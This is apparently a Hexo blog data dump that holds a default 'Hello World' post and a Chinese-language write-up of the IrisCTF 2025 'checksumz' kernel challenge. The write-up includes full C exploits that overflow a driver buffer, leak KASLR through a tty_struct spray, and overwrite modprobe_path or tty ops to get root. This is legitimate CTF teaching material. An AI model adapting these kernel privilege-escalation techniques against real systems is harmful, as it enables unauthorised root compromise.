[documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)","source":"_posts/hello-world.md","raw":"title: Hello World\ndate: 2025-03-20 14:41:45\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)","slug":"hello-world","published":1,"updated":"2025-03-20T06:41:45.495Z","_id":"cm8gmb4210000z52e1abq3xgh","comments":1,"layout":"post","photos":[],"content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\">Quick Start</h2>\n<h3 id=\"Create-a-new-post\">Create a new post</h3>\n<pre><code class=\"hljs bash\">$ hexo new <span class=\"hljs-string\">&quot;My New Post&quot;</span></code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\">Run server</h3>\n<pre><code class=\"hljs bash\">$ hexo server</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\">Generate static files</h3>\n<pre><code class=\"hljs bash\">$ hexo generate</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\">Deploy to remote sites</h3>\n<pre><code class=\"hljs bash\">$ hexo deploy</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\">Quick Start</h2>\n<h3 id=\"Create-a-new-post\">Create a new post</h3>\n<pre><code class=\"hljs bash\">$ hexo new <span class=\"hljs-string\">&quot;My New Post&quot;</span></code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\">Run server</h3>\n<pre><code class=\"hljs bash\">$ hexo server</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\">Generate static files</h3>\n<pre><code class=\"hljs bash\">$ hexo generate</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\">Deploy to remote sites</h3>\n<pre><code class=\"hljs bash\">$ hexo deploy</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"irisctf checksumz 2025 (modprobe_path)","description":"内核学习","date":"2025-03-20T04:39:41.000Z","_content":"用2025 irisctf checksumz 来学习modprobe path来任意代码执行\n\nhttps://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz\n\n\n\n题目有四个基础功能，都是对一个结构体进行操作\n\n```c\nstruct checksum_buffer {\n        loff_t pos;\n        char state[512];\n        size_t size;\n        size_t read;\n        char* name;\n        uint32_t s1;\n        uint32_t s2;\n};\n```\n\n\n\n初始化\n\n```c\nbuffer->pos = 0;\nbuffer->size = 512;\nbuffer->read = 0;\nbuffer->name = kzalloc(1000, GFP_KERNEL);\nbuffer->s1 = 1;\nbuffer->s2 = 0;\n```\n\nname在内核堆创造了一个空间为1000的堆块，放在kmalloc-1024\n\n\n\nread\n\n```c\nstatic ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {\n        struct checksum_buffer* buffer = iocb->ki_filp->private_data;\n        size_t bytes = iov_iter_count(to);\n\n        if (!buffer)\n                return -EBADFD;\n        if (!bytes)\n                return 0;\n        if (buffer->read >= buffer->size) {\n                buffer->read = 0;\n                return 0;\n        }\n\n        ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);\n\n        buffer->read += copied;\n        buffer->pos += copied;\n        if (buffer->pos >= buffer->size)\n                buffer->pos = buffer->size - 1;\n\n        return copied;\n}\n```\n\n最多能读256个字节\n\n\n\nIoctl 功能\n\n```c\nstatic long checksumz_ioctl(struct file *file, unsigned int command, unsigned long arg) {\n        struct checksum_buffer* buffer = file->private_data;\n\n        if (!file->private_data)\n                return -EBADFD;\n        \n        switch (command) {\n                case CHECKSUMZ_IOCTL_RESIZE:\n                        if (arg <= buffer->size && arg > 0) {\n                                buffer->size = arg;\n                                buffer->pos = 0;\n                        } else\n                                return -EINVAL;\n\n                        return 0;\n                case CHECKSUMZ_IOCTL_RENAME:\n                        char __user *user_name_buf = (char __user*) arg;\n\n                        if (copy_from_user(buffer->name, user_name_buf, 48)) {\n                                return -EFAULT;\n                        }\n\n                        return 0;\n                case CHECKSUMZ_IOCTL_PROCESS:\n                        adler32(buffer->state, buffer->size, &buffer->s1, &buffer->s2);\n                        memset(buffer->state, 0, buffer->size);\n                        return 0;\n                case CHECKSUMZ_IOCTL_DIGEST:\n                        uint32_t __user *user_digest_buf = (uint32_t __user*) arg;\n                        uint32_t digest = buffer->s1 | (buffer->s2 << 16);\n\n                        if (copy_to_user(user_digest_buf, &digest, sizeof(uint32_t))) {\n                                return -EFAULT;\n                        }\n\n                        return 0;\n                default:\n                        return -EINVAL;\n        }\n\n        return 0;\n}\n```\n\n这里除了rename其他功能对攻击没帮助，有这些只是为了符合题目场景\n\n\n\nWrite\n\n```c\nstatic ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {\n        struct checksum_buffer* buffer = iocb->ki_filp->private_data;\n        size_t bytes = iov_iter_count(from);\n \n        if (!buffer)\n                        return -EBADFD;\n        if (!bytes)\n                        return 0;\n\n                ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from);\n \n                buffer->pos += copied;\n                if (buffer->pos >= buffer->size)\n                        buffer->pos = buffer->size - 1;\n                \n        return copied;\n}\n```\n\n可以往buf偏移上写最多16字节，这里配合下一个功能可以实现一些奇特的功能\n\n\n\nLseek\n\n```c\nstatic loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {\n        struct checksum_buffer* buffer = file->private_data;\n\n        switch (whence) {\n                case SEEK_SET:\n                        buffer->pos = offset;\n                        break;\n                case SEEK_CUR:\n                        buffer->pos += offset;\n                        break;\n                case SEEK_END:\n                        buffer->pos = buffer->size - offset;\n                        break;\n                default:\n                        return -EINVAL;\n        }\n\n        if (buffer->pos < 0)\n                buffer->pos = 0;\n\n        if (buffer->pos >= buffer->size)\n                buffer->pos = buffer->size - 1;\n\n        return buffer->pos;\n}\n```\n\n可以改pos为任意小于size的值，如果把pos改成512可以溢出15字节。这15字节可以覆盖size到一个很大的值，实现相对任意写。\n\n\n\n```c\nchar* name;\n```\n\n可见name为指针，不难想到覆盖指针来利用rename来进行任意写\n\n\n\nPOC\n\n```c\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nint fd;\n\nint main() {\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        lseek(fd, 512, SEEK_SET);\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n}\n```\n\n\n\n![](/pic/output.jpg)\n\nsize已经被覆盖成0xffffffffffffffff，这样可以改pos来进行相对任意写和读。\n\n为了能够知道内核地址，我们需要拿到kaslr基地址。可以利用tty_struct 来创造含有内核地址的堆块\n\n```C\nfor(int i=0;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n```\n\n\n\n这样在buf下面会有tty堆块可以读。在泄漏过程中可能会出现泄漏不成功，可以选择多创造点堆块来提升稳定性和在不同位置读堆块来稳定的获得基地址。\n\n\n\n![](/pic/1fc6b364-f6cc-40ff-964d-6de02e1ff1de.jpg)\n\n最后，把name指针改为modprobe_path来覆盖为/tmp/x，这样可以在root权限进行任意代码。\n\n\n\nmodprobe\n\n完整exp\n\n```c\n//192.168.64.6:8080/exp\n\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <sys/mman.h>\n#include <signal.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <linux/userfaultfd.h>\n#include <sys/wait.h>\n#include <poll.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n\nint fd, spray[0x100];\nunsigned long user_ss, user_sp, user_cs, user_rflags, kaslr;\n\n#define modprobe_path kaslr+0x1b3f100\n\nvoid save_state(){\n        __asm__(\n                \".intel_syntax noprefix;\"\n                \"mov user_cs, cs;\"\n                \"mov user_ss, ss;\"\n                \"mov user_sp, rsp;\"\n                \"pushf;\"\n                \"pop user_rflags;\"\n                \".att_syntax;\"\n           );\n}\n\n\nvoid shell(){\n        printf(\"[+] UID %d\\n\",getuid());\n        system(\"/bin/sh\");\n}\n\n\nunsigned long user_rip = (unsigned long)shell;\n\nint main() {\n        save_state();\n        for(int i=0;i<0x80;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        for(int i=0x80;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        lseek(fd, 512, SEEK_SET);\n\n        int good;\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n        for(int i=0;i<8;i++){\n                lseek(fd, 1048+i*1024, SEEK_SET);\n                read(fd, buf, 8);\n                kaslr = buf[0] - 0x1289480;\n                printf(\"%lx\\n\", kaslr);\n                printf(\"%lx\\n\", (kaslr & ~0xffffff));\n                if((kaslr & ~0xffffff) == kaslr){\n                        printf(\"kaslr %lx\\n\", kaslr);\n                        printf(\"modprobe_path %lx\\n\", modprobe_path);\n                        good = 1;\n                        break;\n                }\n        }\n        //puts(\"Done\");\n        if(!good){\n                puts(\"[x] exploit failed\");\n                exit(0);\n        }\n        lseek(fd, 528, SEEK_SET);\n        buf[0] = modprobe_path;\n        write(fd, buf, 8);\n        char *path = \"/tmp/x\";\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);\n\n        system(\"echo '#!/bin/sh\\ncp /dev/vda /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/x\");\n        system(\"chmod +x /tmp/x\");\n        system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n        system(\"chmod +x /tmp/dummy\");\n        system(\"/tmp/dummy\");\n        system(\"cat /tmp/flag\");\n\n}\n```\n\n\n\n可能讲的不好，有建议或者讲错或讲的不对都可以提出来。这解是给预期，预期解如果能做出来可能会再写篇文章。：）\n\ntty_struct 打法\n\n```c\n//192.168.64.6:8080/exp\n\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <sys/mman.h>\n#include <signal.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <linux/userfaultfd.h>\n#include <sys/wait.h>\n#include <poll.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n\nint fd, spray[0x100];\nunsigned long user_ss, user_sp, user_cs, user_rflags, kaslr, name[1];\n\n//#define modprobe_path kaslr+0x1b3f100\n#define pivot kaslr+0x185b884\n\nvoid save_state(){\n        __asm__(\n                \".intel_syntax noprefix;\"\n                \"mov user_cs, cs;\"\n                \"mov user_ss, ss;\"\n                \"mov user_sp, rsp;\"\n                \"pushf;\"\n                \"pop user_rflags;\"\n                \".att_syntax;\"\n           );\n}\n\n\nvoid shell(){\n        printf(\"[+] UID %d\\n\",getuid());\n        system(\"/bin/sh\");\n}\n\n\nunsigned long user_rip = (unsigned long)shell;\n\nint main() {\n        save_state();\n        for(int i=0;i<0x80;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        for(int i=0x80;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n\n        lseek(fd, 512, SEEK_SET);\n\n        int good = 0;\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n        for(int i=0;i<8;i++){\n                lseek(fd, 1048+i*1024, SEEK_SET);\n                read(fd, buf, 8);\n                kaslr = buf[0] - 0x1289480;\n                printf(\"%lx\\n\", buf[0]);\n                if((kaslr & ~0xfffff) == kaslr){\n                        printf(\"kaslr %lx\\n\", kaslr);\n                        printf(\"modprobe_path %lx\\n\", pivot);\n                        good = 1;\n                        break;\n                }\n        }\n        //puts(\"Done\");\n        if(!good){\n                puts(\"[x] exploit failed\");\n                exit(0);\n        }\n        lseek(fd, 528, SEEK_SET);\n        read(fd, buf, 8);\n        name[0] = buf[0];\n        printf(\"name addr %lx\\n\", name[0]);\n        lseek(fd, 528, SEEK_SET);\n\n        unsigned long fake_ops[4];\n        for(int t=0;t<16;t++){\n                //for(int i=0;i<4;i++){ fake_ops[i] = 0xffffffffdead0000 + ((i+t*4) << 8); }\n                for(int i=0;i<4;i++){ fake_ops[i] = pivot; }\n                ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)fake_ops);\n                name[0] += 32;\n                write(fd, name, 8);\n                lseek(fd, 528, SEEK_SET);\n        }\n        name[0] -= 512;\n        lseek(fd, 1048, SEEK_SET);\n        write(fd, name, 8);\n\n        for(int i=0;i<0x100;i++){ ioctl(spray[i], 0x41414141, 0x42424242); }\n\n        /*\n        buf[0] = modprobe_path;\n        write(fd, buf, 8);\n        char *path = \"/tmp/x\";\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);\n\n        system(\"echo '#!/bin/sh\\n/bin/sh' > /tmp/sh\");\n        system(\"chmod +x /tmp/sh\");\n        system(\"echo '#!/bin/sh\\nmv /tmp/sh /bin/poweroff' > /tmp/x\");\n        system(\"chmod +x /tmp/x\");\n        system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n        system(\"chmod +x /tmp/dummy\");\n        system(\"/tmp/dummy\");\n        */\n}\n```\n\n没找到合适的gadget来写rop\n\n参考\n\nhttps://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/","source":"_posts/irisctf-checksumz-2025-modprobe-path.md","raw":"title: irisctf checksumz 2025 (modprobe_path)\ntags: Kernel\ndescription: 内核学习\ndate: 2025-03-20 12:39:41\n---\n用2025 irisctf checksumz 来学习modprobe path来任意代码执行\n\nhttps://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz\n\n\n\n题目有四个基础功能，都是对一个结构体进行操作\n\n```c\nstruct checksum_buffer {\n        loff_t pos;\n        char state[512];\n        size_t size;\n        size_t read;\n        char* name;\n        uint32_t s1;\n        uint32_t s2;\n};\n```\n\n\n\n初始化\n\n```c\nbuffer->pos = 0;\nbuffer->size = 512;\nbuffer->read = 0;\nbuffer->name = kzalloc(1000, GFP_KERNEL);\nbuffer->s1 = 1;\nbuffer->s2 = 0;\n```\n\nname在内核堆创造了一个空间为1000的堆块，放在kmalloc-1024\n\n\n\nread\n\n```c\nstatic ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {\n        struct checksum_buffer* buffer = iocb->ki_filp->private_data;\n        size_t bytes = iov_iter_count(to);\n\n        if (!buffer)\n                return -EBADFD;\n        if (!bytes)\n                return 0;\n        if (buffer->read >= buffer->size) {\n                buffer->read = 0;\n                return 0;\n        }\n\n        ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);\n\n        buffer->read += copied;\n        buffer->pos += copied;\n        if (buffer->pos >= buffer->size)\n                buffer->pos = buffer->size - 1;\n\n        return copied;\n}\n```\n\n最多能读256个字节\n\n\n\nIoctl 功能\n\n```c\nstatic long checksumz_ioctl(struct file *file, unsigned int command, unsigned long arg) {\n        struct checksum_buffer* buffer = file->private_data;\n\n        if (!file->private_data)\n                return -EBADFD;\n        \n        switch (command) {\n                case CHECKSUMZ_IOCTL_RESIZE:\n                        if (arg <= buffer->size && arg > 0) {\n                                buffer->size = arg;\n                                buffer->pos = 0;\n                        } else\n                                return -EINVAL;\n\n                        return 0;\n                case CHECKSUMZ_IOCTL_RENAME:\n                        char __user *user_name_buf = (char __user*) arg;\n\n                        if (copy_from_user(buffer->name, user_name_buf, 48)) {\n                                return -EFAULT;\n                        }\n\n                        return 0;\n                case CHECKSUMZ_IOCTL_PROCESS:\n                        adler32(buffer->state, buffer->size, &buffer->s1, &buffer->s2);\n                        memset(buffer->state, 0, buffer->size);\n                        return 0;\n                case CHECKSUMZ_IOCTL_DIGEST:\n                        uint32_t __user *user_digest_buf = (uint32_t __user*) arg;\n                        uint32_t digest = buffer->s1 | (buffer->s2 << 16);\n\n                        if (copy_to_user(user_digest_buf, &digest, sizeof(uint32_t))) {\n                                return -EFAULT;\n                        }\n\n                        return 0;\n                default:\n                        return -EINVAL;\n        }\n\n        return 0;\n}\n```\n\n这里除了rename其他功能对攻击没帮助，有这些只是为了符合题目场景\n\n\n\nWrite\n\n```c\nstatic ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {\n        struct checksum_buffer* buffer = iocb->ki_filp->private_data;\n        size_t bytes = iov_iter_count(from);\n \n        if (!buffer)\n                        return -EBADFD;\n        if (!bytes)\n                        return 0;\n\n                ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from);\n \n                buffer->pos += copied;\n                if (buffer->pos >= buffer->size)\n                        buffer->pos = buffer->size - 1;\n                \n        return copied;\n}\n```\n\n可以往buf偏移上写最多16字节，这里配合下一个功能可以实现一些奇特的功能\n\n\n\nLseek\n\n```c\nstatic loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {\n        struct checksum_buffer* buffer = file->private_data;\n\n        switch (whence) {\n                case SEEK_SET:\n                        buffer->pos = offset;\n                        break;\n                case SEEK_CUR:\n                        buffer->pos += offset;\n                        break;\n                case SEEK_END:\n                        buffer->pos = buffer->size - offset;\n                        break;\n                default:\n                        return -EINVAL;\n        }\n\n        if (buffer->pos < 0)\n                buffer->pos = 0;\n\n        if (buffer->pos >= buffer->size)\n                buffer->pos = buffer->size - 1;\n\n        return buffer->pos;\n}\n```\n\n可以改pos为任意小于size的值，如果把pos改成512可以溢出15字节。这15字节可以覆盖size到一个很大的值，实现相对任意写。\n\n\n\n```c\nchar* name;\n```\n\n可见name为指针，不难想到覆盖指针来利用rename来进行任意写\n\n\n\nPOC\n\n```c\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nint fd;\n\nint main() {\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        lseek(fd, 512, SEEK_SET);\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n}\n```\n\n\n\n![](/pic/output.jpg)\n\nsize已经被覆盖成0xffffffffffffffff，这样可以改pos来进行相对任意写和读。\n\n为了能够知道内核地址，我们需要拿到kaslr基地址。可以利用tty_struct 来创造含有内核地址的堆块\n\n```C\nfor(int i=0;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n```\n\n\n\n这样在buf下面会有tty堆块可以读。在泄漏过程中可能会出现泄漏不成功，可以选择多创造点堆块来提升稳定性和在不同位置读堆块来稳定的获得基地址。\n\n\n\n![](/pic/1fc6b364-f6cc-40ff-964d-6de02e1ff1de.jpg)\n\n最后，把name指针改为modprobe_path来覆盖为/tmp/x，这样可以在root权限进行任意代码。\n\n\n\nmodprobe\n\n完整exp\n\n```c\n//192.168.64.6:8080/exp\n\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <sys/mman.h>\n#include <signal.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <linux/userfaultfd.h>\n#include <sys/wait.h>\n#include <poll.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n\nint fd, spray[0x100];\nunsigned long user_ss, user_sp, user_cs, user_rflags, kaslr;\n\n#define modprobe_path kaslr+0x1b3f100\n\nvoid save_state(){\n        __asm__(\n                \".intel_syntax noprefix;\"\n                \"mov user_cs, cs;\"\n                \"mov user_ss, ss;\"\n                \"mov user_sp, rsp;\"\n                \"pushf;\"\n                \"pop user_rflags;\"\n                \".att_syntax;\"\n           );\n}\n\n\nvoid shell(){\n        printf(\"[+] UID %d\\n\",getuid());\n        system(\"/bin/sh\");\n}\n\n\nunsigned long user_rip = (unsigned long)shell;\n\nint main() {\n        save_state();\n        for(int i=0;i<0x80;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        for(int i=0x80;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        lseek(fd, 512, SEEK_SET);\n\n        int good;\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n        for(int i=0;i<8;i++){\n                lseek(fd, 1048+i*1024, SEEK_SET);\n                read(fd, buf, 8);\n                kaslr = buf[0] - 0x1289480;\n                printf(\"%lx\\n\", kaslr);\n                printf(\"%lx\\n\", (kaslr & ~0xffffff));\n                if((kaslr & ~0xffffff) == kaslr){\n                        printf(\"kaslr %lx\\n\", kaslr);\n                        printf(\"modprobe_path %lx\\n\", modprobe_path);\n                        good = 1;\n                        break;\n                }\n        }\n        //puts(\"Done\");\n        if(!good){\n                puts(\"[x] exploit failed\");\n                exit(0);\n        }\n        lseek(fd, 528, SEEK_SET);\n        buf[0] = modprobe_path;\n        write(fd, buf, 8);\n        char *path = \"/tmp/x\";\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);\n\n        system(\"echo '#!/bin/sh\\ncp /dev/vda /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/x\");\n        system(\"chmod +x /tmp/x\");\n        system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n        system(\"chmod +x /tmp/dummy\");\n        system(\"/tmp/dummy\");\n        system(\"cat /tmp/flag\");\n\n}\n```\n\n\n\n可能讲的不好，有建议或者讲错或讲的不对都可以提出来。这解是给预期，预期解如果能做出来可能会再写篇文章。：）\n\ntty_struct 打法\n\n```c\n//192.168.64.6:8080/exp\n\n#include \"api.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <sys/mman.h>\n#include <signal.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <linux/userfaultfd.h>\n#include <sys/wait.h>\n#include <poll.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n\nint fd, spray[0x100];\nunsigned long user_ss, user_sp, user_cs, user_rflags, kaslr, name[1];\n\n//#define modprobe_path kaslr+0x1b3f100\n#define pivot kaslr+0x185b884\n\nvoid save_state(){\n        __asm__(\n                \".intel_syntax noprefix;\"\n                \"mov user_cs, cs;\"\n                \"mov user_ss, ss;\"\n                \"mov user_sp, rsp;\"\n                \"pushf;\"\n                \"pop user_rflags;\"\n                \".att_syntax;\"\n           );\n}\n\n\nvoid shell(){\n        printf(\"[+] UID %d\\n\",getuid());\n        system(\"/bin/sh\");\n}\n\n\nunsigned long user_rip = (unsigned long)shell;\n\nint main() {\n        save_state();\n        for(int i=0;i<0x80;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n        fd = open(\"/dev/checksumz\", O_RDWR);\n        for(int i=0x80;i<0x100;i++){ spray[i] = open(\"/dev/ptmx\", O_RDONLY | O_NOCTTY); }\n\n        lseek(fd, 512, SEEK_SET);\n\n        int good = 0;\n        unsigned long buf[2];\n        memset(buf, 0xff, sizeof(buf));\n        write(fd, buf, sizeof(buf));\n        for(int i=0;i<8;i++){\n                lseek(fd, 1048+i*1024, SEEK_SET);\n                read(fd, buf, 8);\n                kaslr = buf[0] - 0x1289480;\n                printf(\"%lx\\n\", buf[0]);\n                if((kaslr & ~0xfffff) == kaslr){\n                        printf(\"kaslr %lx\\n\", kaslr);\n                        printf(\"modprobe_path %lx\\n\", pivot);\n                        good = 1;\n                        break;\n                }\n        }\n        //puts(\"Done\");\n        if(!good){\n                puts(\"[x] exploit failed\");\n                exit(0);\n        }\n        lseek(fd, 528, SEEK_SET);\n        read(fd, buf, 8);\n        name[0] = buf[0];\n        printf(\"name addr %lx\\n\", name[0]);\n        lseek(fd, 528, SEEK_SET);\n\n        unsigned long fake_ops[4];\n        for(int t=0;t<16;t++){\n                //for(int i=0;i<4;i++){ fake_ops[i] = 0xffffffffdead0000 + ((i+t*4) << 8); }\n                for(int i=0;i<4;i++){ fake_ops[i] = pivot; }\n                ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)fake_ops);\n                name[0] += 32;\n                write(fd, name, 8);\n                lseek(fd, 528, SEEK_SET);\n        }\n        name[0] -= 512;\n        lseek(fd, 1048, SEEK_SET);\n        write(fd, name, 8);\n\n        for(int i=0;i<0x100;i++){ ioctl(spray[i], 0x41414141, 0x42424242); }\n\n        /*\n        buf[0] = modprobe_path;\n        write(fd, buf, 8);\n        char *path = \"/tmp/x\";\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);\n\n        system(\"echo '#!/bin/sh\\n/bin/sh' > /tmp/sh\");\n        system(\"chmod +x /tmp/sh\");\n        system(\"echo '#!/bin/sh\\nmv /tmp/sh /bin/poweroff' > /tmp/x\");\n        system(\"chmod +x /tmp/x\");\n        system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n        system(\"chmod +x /tmp/dummy\");\n        system(\"/tmp/dummy\");\n        */\n}\n```\n\n没找到合适的gadget来写rop\n\n参考\n\nhttps://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/","slug":"irisctf-checksumz-2025-modprobe-path","published":1,"updated":"2025-03-20T06:48:25.067Z","_id":"cm8gv4pnr0000x12e8iz6cibg","comments":1,"layout":"post","photos":[],"content":"<p>用2025 irisctf checksumz 来学习modprobe path来任意代码执行</p>\n<p><a href=\"https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz\">https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz</a></p>\n<p>题目有四个基础功能，都是对一个结构体进行操作</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span> &#123;</span>\n        <span class=\"hljs-type\">loff_t</span> pos;\n        <span class=\"hljs-type\">char</span> state[<span class=\"hljs-number\">512</span>];\n        <span class=\"hljs-type\">size_t</span> size;\n        <span class=\"hljs-type\">size_t</span> read;\n        <span class=\"hljs-type\">char</span>* name;\n        <span class=\"hljs-type\">uint32_t</span> s1;\n        <span class=\"hljs-type\">uint32_t</span> s2;\n&#125;;</code></pre>\n<p>初始化</p>\n<pre><code class=\"hljs c\">buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\nbuffer-&gt;size = <span class=\"hljs-number\">512</span>;\nbuffer-&gt;read = <span class=\"hljs-number\">0</span>;\nbuffer-&gt;name = kzalloc(<span class=\"hljs-number\">1000</span>, GFP_KERNEL);\nbuffer-&gt;s1 = <span class=\"hljs-number\">1</span>;\nbuffer-&gt;s2 = <span class=\"hljs-number\">0</span>;</code></pre>\n<p>name在内核堆创造了一个空间为1000的堆块，放在kmalloc-1024</p>\n<p>read</p>\n<pre><code 